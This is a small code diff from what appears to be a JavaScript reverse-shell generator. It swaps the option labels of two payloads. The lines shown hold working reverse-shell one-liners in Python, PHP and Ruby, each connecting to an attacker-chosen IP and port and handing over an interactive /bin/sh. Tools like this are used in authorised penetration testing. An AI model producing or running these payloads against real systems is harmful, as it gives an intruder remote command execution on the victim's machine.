@@ -30,10 +30,10 @@ function getShell() {
             case "option3":
               payload = `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip_arg}",${port_arg}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`;
               break;
-            case "option4":
+            case "option5":
               payload = `php -r '$sock=fsockopen("${ip_arg}",${port_arg});exec("/bin/sh -i <&3 >&3 2>&3");'`;
               break;
-            case "option5":
+            case "option4":
               payload = `ruby -rsocket -e'f=TCPSocket.open("${ip_arg}",${port_arg}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`;
               break;
             case "option6":
